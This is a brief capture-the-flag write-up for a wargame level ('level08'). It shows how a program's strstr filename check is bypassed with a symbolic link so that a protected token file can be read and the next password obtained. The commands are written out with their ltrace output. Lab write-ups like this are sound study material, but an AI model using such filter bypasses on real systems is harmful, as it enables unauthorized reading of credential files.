▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▓▓▌▐▓▓▓▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌▐▓▌
▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌   ▐▓▌▐▓▌▐▓▓▓▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌▐▓▌
▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌

exploit: strstr bypass with symbolic links

=======

We have a script and a token file. We dont have permissions for the token file. Let's test the script with a custom file:

echo 'bonjour les amis' > /tmp/test2
./level08 /tmp/test2
bonjour les amis

Ok so it prints the content of the file. We need to use this to our adventage. 

ltrace ./level08 /tmp/test
strstr("/tmp/test", "token")                                    = NULL
open("/tmp/test", 0, 014435162522)                              = 3

ltrace ./level08 token
strstr("token", "token")                                        = "token"

Ok so it is a simple strstr check. We still need to content of the token so let's create a symbolic link to buypass this silly check.
ln -s /home/user/level08/token /tmp/link

Calling the programm with this symbolic link works and we get the password to flag08.
